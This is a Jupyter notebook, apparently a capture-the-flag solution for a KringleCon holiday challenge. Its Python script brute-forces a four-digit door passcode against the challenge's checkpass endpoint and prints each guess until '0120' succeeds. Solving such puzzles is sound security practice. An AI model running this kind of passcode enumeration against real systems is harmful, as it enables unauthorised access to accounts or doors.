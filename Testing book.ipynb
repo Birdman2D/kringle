{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0000 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0001 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0002 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0003 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0010 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0011 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0012 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0013 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0020 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0021 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0022 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0023 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0030 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0031 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0032 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0033 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0100 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0101 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0102 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0103 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0110 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0111 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0112 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0113 {'success': False, 'message': 'Incorrect guess.'}\n",
      "0120 {'success': True, 'resourceId': 'dcf77635-6971-4503-a8ea-87bcabf0c07c', 'hash': '8f5a30830a955c6ff1e5b6d8106e7702606a3d49cdd5ee04969104937c22347c', 'message': 'Correct guess!'}\n",
      "0120 {'success': True, 'resourceId': 'dcf77635-6971-4503-a8ea-87bcabf0c07c', 'hash': '8f5a30830a955c6ff1e5b6d8106e7702606a3d49cdd5ee04969104937c22347c', 'message': 'Correct guess!'}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from itertools import product\n",
    "import json\n",
    "\n",
    "url ='https://doorpasscode.kringlecastle.com/checkpass.php?i='\n",
    "digits = ['0','1','2','3']\n",
    "keyspace = [''.join(i) for i in list(product(digits, repeat=4))]\n",
    "rid = 'dcf77635-6971-4503-a8ea-87bcabf0c07c'\n",
    "for code in keyspace:\n",
    "    r = requests.get(f\"{url}{code}&resourceId={rid}\")\n",
    "    r = json.loads(r.text)\n",
    "    print(code, r)\n",
    "    if r['success']:\n",
    "        print(code, r)\n",
    "        break;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
